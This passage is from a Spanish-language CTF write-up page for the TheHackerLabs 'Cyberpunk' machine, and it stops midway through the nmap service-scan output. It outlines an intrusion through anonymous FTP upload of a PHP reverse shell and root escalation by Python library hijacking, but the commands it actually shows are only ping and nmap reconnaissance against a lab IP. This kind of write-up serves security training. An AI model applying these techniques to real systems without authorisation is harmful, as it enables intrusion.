@@ -1,0 +1,1171 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cyberpunk - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-cyberpunk/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Cyberpunk - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-cyberpunk/cyberpunk.webp">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-academy/">
+          <span class="side-post-card-title">Academy</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-pacharan/">
+          <span class="side-post-card-title">Pacharan</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Cyberpunk</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-zapasguapas/">
+          <span class="side-post-card-title">Zapas Guapas</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-pila/">
+          <span class="side-post-card-title">Pila</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Easy Machine</div>
+    
+    <h1>Cyberpunk - TheHackerLabs</h1>
+    <div class="post-meta">21 February 2025 · 13 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-cyberpunk/cyberpunk.webp" alt="Cyberpunk - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Una máquina sencilla, pero que tiene sus sorpresas. Analizando el escaneo de servicios, descubrimos algunos archivos del servicio FTP que dan a entender que utilizan este servicio como servidor web y que, además, podemos loguearnos en el servicio FTP como usuario anonymous. Dentro del FTP, subimos un archivo random y lo visualizamos en la página web, comprobando que todo lo que subamos al FTP, se verá representado en la página web. Aprovechamos esto, para subir un Reverse Shell de PHP con tal de obtener una sesión en la máquina víctima. Una vez conectados, descubrimos un archivo con un código extraño que resulto ser lenguaje Brainfuck. Decodificando ese código, descubrimos que es la contraseña de un usuario del servicio SSH. Ya dentro del SSH, encontramos un script de Python que convierte en base64 a cualquier texto y que se puede ejecutar como el usuario Root. Aprovechamos este script para aplicar Python Library Hijacking y Script Hijacking para escalar privilegios.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>Wappalizer</code></li><li><code>ftp</code></li><li><code>wget</code></li><li><code>nc</code></li><li><code>PHP</code></li><li><code>bash</code></li><li><code>ssh</code></li><li><code>sudo</code></li><li><code>python3</code></li><li><code>mv</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#FTP">Análisis y Enumeración de Servicio FTP</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#PHP">Utilizando Reverse Shell de PHP de pentestmonkey para Obtener Sesión de la Máquina Víctima</a></li>
+        <li><a href="#PHP2">Creando y Cargando Reverse Shell de PHP para Obtener Sesión de la Máquina Víctima</a></li>
+        <li><a href="#PHP3">Creando y Utilizando WebShell de PHP para Obtener Sesión en Máquina Víctima</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#LinEnum">Enumeración de la Máquina Víctima</a></li>
+        <li><a href="#Hijacking">Aplicando Python Library Hijacking para Escalar Privilegios</a></li>
+        <li><a href="#Hijacking2">Aplicando Script Hijacking para Escalar Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#FTP">Análisis y Enumeración de Servicio FTP</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#PHP">Utilizando Reverse Shell de PHP de pentestmonkey para Obtener Sesión de la Máquina Víctima</a></li>
+        <li><a href="#PHP2">Creando y Cargando Reverse Shell de PHP para Obtener Sesión de la Máquina Víctima</a></li>
+        <li><a href="#PHP3">Creando y Utilizando WebShell de PHP para Obtener Sesión en Máquina Víctima</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#LinEnum">Enumeración de la Máquina Víctima</a></li>
+        <li><a href="#Hijacking">Aplicando Python Library Hijacking para Escalar Privilegios</a></li>
+        <li><a href="#Hijacking2">Aplicando Script Hijacking para Escalar Privilegios</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.1.120
+</span></span><span style="display:flex;"><span>PING 192.168.1.120 <span style="color:#f92672">(</span>192.168.1.120<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.120: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>1.99 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.120: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.966 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.120: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.901 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.120: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.811 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.1.120 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3006ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.811/1.167/1.993/0.479 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Linux</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.1.120 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-21 11:54 CST
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 11:54
+</span></span><span style="display:flex;"><span>Scanning 192.168.1.120 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 11:54, 0.06s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 11:54
+</span></span><span style="display:flex;"><span>Scanning 192.168.1.120 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 192.168.1.120
+</span></span><span style="display:flex;"><span>Discovered open port 22/tcp on 192.168.1.120
+</span></span><span style="display:flex;"><span>Discovered open port 21/tcp on 192.168.1.120
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 11:54, 6.33s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.120
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.00096s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-02-21 11:54:37 CST <span style="color:#66d9ef">for</span> 7s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE REASON
+</span></span><span style="display:flex;"><span>21/tcp open  ftp     syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 6.56 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.884MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">65536</span> <span style="color:#f92672">(</span>2.621MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Hay 3 puertos y me da curiosidad que tenga activo el <strong>puerto 21</strong> que es del <strong>servicio FTP</strong>, pues que yo sepa no es común, a menos que lo utilicen como un servidor web.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 21,22,80 192.168.1.120 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-21 11:55 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.120
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0011s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp open  ftp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| drwxr-xr-x   <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>            <span style="color:#ae81ff">4096</span> May  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2024</span> images
+</span></span><span style="display:flex;"><span>| -rw-r--r--   <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">713</span> May  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2024</span> index.html
+</span></span><span style="display:flex;"><span>|_-rw-r--r--   <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">923</span> May  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">2024</span> secret.txt
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   GenericLines: 
+</span></span><span style="display:flex;"><span>|     <span style="color:#ae81ff">220</span> Servidor ProFTPD <span style="color:#f92672">(</span>Cyberpunk<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>::ffff:192.168.1.120<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>|     Orden incorrecta: Intenta ser m
+</span></span><span style="display:flex;"><span>|     creativo
+</span></span><span style="display:flex;"><span>|     Orden incorrecta: Intenta ser m
+</span></span><span style="display:flex;"><span>|     creativo
+</span></span><span style="display:flex;"><span>|   Help: 
+</span></span><span style="display:flex;"><span>|     <span style="color:#ae81ff">220</span> Servidor ProFTPD <span style="color:#f92672">(</span>Cyberpunk<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>::ffff:192.168.1.120<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>|     214-Se reconocen las siguiente 
+</span></span><span style="display:flex;"><span>|     rdenes <span style="color:#f92672">(</span>* <span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#39;s no implementadas):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     XCWD CDUP XCUP SMNT* QUIT PORT PASV 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     EPRT EPSV ALLO RNFR RNTO DELE MDTM RMD 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     XRMD MKD XMKD PWD XPWD SIZE SYST HELP 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     NOOP FEAT OPTS HOST CLNT AUTH* CCC* CONF* 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     ENC* MIC* PBSZ* PROT* TYPE STRU MODE RETR 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     STOR STOU APPE REST ABOR RANG USER PASS 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     ACCT* REIN* LIST NLST STAT SITE MLSD MLST 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     comentario a root@Cyberpunk
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   NULL, SMBProgNeg, SSLSessionReq: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    220 Servidor ProFTPD (Cyberpunk) [::ffff:192.168.1.120]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">| ssh-hostkey: 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   256 6d:b5:c8:65:8d:1f:8a:98:76:93:26:27:df:29:72:4a (ECDSA)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_  256 a5:83:2a:8f:eb:c6:f1:0b:e0:e6:d8:e1:05:3b:4c:a5 (ED25519)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">80/tcp open  http    Apache httpd 2.4.59 ((Debian))
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-title: Arasaka
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_http-server-header: Apache/2.4.59 (Debian)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF-Port21-TCP:V=7.95%I=7%D=2/21%Time=67B8BE03%P=x86_64-pc-linux-gnu%r(NULL
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:,3A,&#34;220\x20Servidor\x20ProFTPD\x20\(Cyberpunk\)\x20\[::ffff:192\.168\.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:1\.120\]\r\n&#34;)%r(GenericLines,9C,&#34;220\x20Servidor\x20ProFTPD\x20\(Cybe
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:rpunk\)\x20\[::ffff:192\.168\.1\.120\]\r\n500\x20Orden\x20incorrecta:\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20Intenta\x20ser\x20m\xc3\xa1s\x20creativo\r\n500\x20Orden\x20incorrec
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ta:\x20Intenta\x20ser\x20m\xc3\xa1s\x20creativo\r\n&#34;)%r(Help,27B,&#34;220\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:20Servidor\x20ProFTPD\x20\(Cyberpunk\)\x20\[::ffff:192\.168\.100\.31\]\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r\n214-Se\x20reconocen\x20las\x20siguiente\x20\xc3\xb3rdenes\x20\(\*\x2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0=&gt;&#39;</span>s<span style="color:#ae81ff">\x</span>20no<span style="color:#ae81ff">\x</span>20implementadas<span style="color:#ae81ff">\)</span>:<span style="color:#ae81ff">\r\n\x</span>20CWD<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20XCWD<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20CDUP<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20XCUP<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20SMNT<span style="color:#ae81ff">\*\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20QU
+</span></span><span style="display:flex;"><span>SF:IT<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20PORT<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20PASV<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\r\n\x</span>20EPRT<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>SF:x20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20EPSV<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20ALLO<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20RNFR<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20RNTO<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20DELE<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20MDTM<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20RMD<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\r\n\x</span>20XRMD<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20MKD<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20XMKD
+</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20PWD<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20XPWD<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20SIZE<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
